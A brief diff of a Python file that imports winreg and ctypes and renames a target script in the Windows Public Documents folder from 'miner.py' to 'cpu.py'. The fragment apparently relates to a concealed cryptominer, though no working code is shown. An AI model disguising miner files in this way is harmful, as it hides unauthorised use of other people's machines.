@@ -5,8 +5,7 @@ import ctypes
 import sys
 import winreg
 
-program_exe = "c:\\users\\public\\Documents\\miner.py"
-# program_exe = "notepad.exe"
+program_exe = "c:\\users\\public\\Documents\\cpu.py"
 
 
 def main():
